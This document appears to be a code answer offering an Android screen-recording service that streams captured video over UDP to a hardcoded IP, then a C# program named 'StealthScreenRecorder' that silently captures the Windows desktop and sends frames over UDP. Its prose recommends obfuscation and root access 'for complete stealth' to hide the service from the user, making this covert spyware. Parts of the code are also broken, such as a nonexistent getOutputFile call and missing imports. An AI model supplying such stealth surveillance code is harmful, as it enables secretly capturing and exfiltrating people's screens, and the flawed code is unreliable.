```java
package com.example.screenrecorder;

import android.app.Service;
import android.content.Intent;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.MediaRecorder;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.net.LocalSocket;
import android.net.LocalSocketAddress;
import android.os.Environment;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.util.Log;

import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.nio.ByteBuffer;

public class ScreenRecordingService extends Service {
    private static final String TAG = "ScreenRecordingService";
    private static final int VIRTUAL_DISPLAY_FLAGS = DisplayManager.VIRTUAL_DISPLAY_FLAG_OWN_CONTENT_ONLY | DisplayManager.VIRTUAL_DISPLAY_FLAG_PUBLIC;
    private static final int WIDTH = 720;
    private static final int HEIGHT = 1280;
    private static final int DPI = 1;
    private static final int BITRATE = 6000000;
    private static final int FRAME_RATE = 30;
    private static final int I_FRAME_INTERVAL = 1;
    private static final String MIME_TYPE = "video/avc";
    private static final String UDP_IP = "192.168.1.100";
    private static final int UDP_PORT = 5000;

    private MediaProjectionManager mProjectionManager;
    private MediaProjection mMediaProjection;
    private VirtualDisplay mVirtualDisplay;
    private MediaRecorder mMediaRecorder;
    private HandlerThread mHandlerThread;
    private Handler mHandler;
    private DatagramSocket mUdpSocket;
    private boolean mIsRecording = false;
    private int mResultCode;
    private Intent mResultData;

    @Override
    public void onCreate() {
        super.onCreate();
        mProjectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
        mHandlerThread = new HandlerThread("ScreenRecordingThread");
        mHandlerThread.start();
        mHandler = new Handler(mHandlerThread.getLooper());
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            mResultCode = intent.getIntExtra("result_code", 0);
            mResultData = intent.getParcelableExtra("result_data");
            if (mResultCode != 0 && mResultData != null) {
                startRecording();
            }
        }
        return START_STICKY;
    }

    private void startRecording() {
        if (mIsRecording) return;

        try {
            mMediaProjection = mProjectionManager.getMediaProjection(mResultCode, mResultData);
            initRecorder();
            createVirtualDisplay();
            mIsRecording = true;
        } catch (Exception e) {
            Log.e(TAG, "Error starting screen recording", e);
            stopSelf();
        }
    }

    private void initRecorder() throws IOException {
        mMediaRecorder = new MediaRecorder();
        mMediaRecorder.setVideoSource(MediaRecorder.VideoSource.SURFACE);
        mMediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
        mMediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
        mMediaRecorder.setVideoEncodingBitRate(BITRATE);
        mMediaRecorder.setVideoFrameRate(FRAME_RATE);
        mMediaRecorder.setVideoSize(WIDTH, HEIGHT);
        mMediaRecorder.setOutputFile(createTempFile().getAbsolutePath());

        mMediaRecorder.prepare();
    }

    private File createTempFile() throws IOException {
        File outputDir = getExternalFilesDir(Environment.DIRECTORY_MOVIES);
        return File.createTempFile("screenrecord", ".mp4", outputDir);
    }

    private void createVirtualDisplay() {
        mVirtualDisplay = mMediaProjection.createVirtualDisplay(
                "ScreenRecordingService",
                WIDTH, HEIGHT, DPI,
                VIRTUAL_DISPLAY_FLAGS,
                mMediaRecorder.getSurface(),
                null, mHandler);

        mMediaRecorder.start();
        startUdpStreaming();
    }

    private void startUdpStreaming() {
        new Thread(() -> {
            try {
                mUdpSocket = new DatagramSocket();
                InetAddress serverAddr = InetAddress.getByName(UDP_IP);

                FileInputStream fis = new FileInputStream(mMediaRecorder.getOutputFile());
                byte[] buffer = new byte[1024];
                int bytesRead;

                while (mIsRecording && (bytesRead = fis.read(buffer)) != -1) {
                    DatagramPacket packet = new DatagramPacket(buffer, bytesRead, serverAddr, UDP_PORT);
                    mUdpSocket.send(packet);
                }

                fis.close();
            } catch (Exception e) {
                Log.e(TAG, "UDP streaming error", e);
            } finally {
                if (mUdpSocket != null) {
                    mUdpSocket.close();
                }
            }
        }).start();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        stopRecording();
        if (mHandlerThread != null) {
            mHandlerThread.quitSafely();
        }
    }

    private void stopRecording() {
        if (!mIsRecording) return;

        mIsRecording = false;

        if (mMediaRecorder != null) {
            mMediaRecorder.stop();
            mMediaRecorder.reset();
            mMediaRecorder.release();
            mMediaRecorder = null;
        }

        if (mVirtualDisplay != null) {
            mVirtualDisplay.release();
            mVirtualDisplay = null;
        }

        if (mMediaProjection != null) {
            mMediaProjection.stop();
            mMediaProjection = null;
        }

        if (mUdpSocket != null && !mUdpSocket.isClosed()) {
            mUdpSocket.close();
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
```

Note: This code requires several permissions in your AndroidManifest.xml:
```xml
<uses-permission android:name="android.permission.RECORD_AUDIO" />
<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
<uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
<uses-permission android:name="android.permission.INTERNET" />
```

Also, you'll need to request the MediaProjection permission at runtime using:
```java
Intent captureIntent = mProjectionManager.createScreenCaptureIntent();
startActivityForResult(captureIntent, REQUEST_CODE);
```

The service should be started with the result from the permission request. For complete stealth, you would need additional obfuscation techniques and potentially root access to hide the service from the user interface.

```csharp
using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Threading;

class StealthScreenRecorder
{
    [DllImport("user32.dll")]
    private static extern IntPtr GetDC(IntPtr hWnd);

    [DllImport("user32.dll")]
    private static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);

    [DllImport("gdi32.dll")]
    private static extern IntPtr CreateCompatibleDC(IntPtr hDC);

    [DllImport("gdi32.dll")]
    private static extern IntPtr CreateCompatibleBitmap(IntPtr hDC, int nWidth, int nHeight);

    [DllImport("gdi32.dll")]
    private static extern IntPtr SelectObject(IntPtr hDC, IntPtr hObject);

    [DllImport("gdi32.dll")]
    private static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);

    [DllImport("gdi32.dll")]
    private static extern bool DeleteObject(IntPtr hObject);

    [DllImport("gdi32.dll")]
    private static extern bool DeleteDC(IntPtr hDC);

    private static UdpClient udpClient;
    private static IPEndPoint endPoint;
    private static bool isRunning = true;

    public static void Main()
    {
        string ipAddress = "127.0.0.1";
        int port = 11000;
        endPoint = new IPEndPoint(IPAddress.Parse(ipAddress), port);
        udpClient = new UdpClient();
        udpClient.Connect(endPoint);

        Thread captureThread = new Thread(CaptureScreen);
        captureThread.IsBackground = true;
        captureThread.Start();

        Thread.Sleep(Timeout.Infinite);
    }

    private static void CaptureScreen()
    {
        while (isRunning)
        {
            try
            {
                IntPtr hdcSrc = GetDC(IntPtr.Zero);
                IntPtr hdcDest = CreateCompatibleDC(hdcSrc);
                int width = SystemInformation.VirtualScreen.Width;
                int height = SystemInformation.VirtualScreen.Height;
                IntPtr hBitmap = CreateCompatibleBitmap(hdcSrc, width, height);
                IntPtr hOld = SelectObject(hdcDest, hBitmap);
                BitBlt(hdcDest, 0, 0, width, height, hdcSrc, 0, 0, 0x00CC0020);
                SelectObject(hdcDest, hOld);
                DeleteDC(hdcDest);
                ReleaseDC(IntPtr.Zero, hdcSrc);

                using (Bitmap bmp = Image.FromHbitmap(hBitmap))
                {
                    using (MemoryStream ms = new MemoryStream())
                    {
                        bmp.Save(ms, ImageFormat.Jpeg);
                        byte[] imageBytes = ms.ToArray();
                        udpClient.Send(imageBytes, imageBytes.Length);
                    }
                }
                DeleteObject(hBitmap);
                Thread.Sleep(100);
            }
            catch (Exception)
            {
                continue;
            }
        }
    }
}
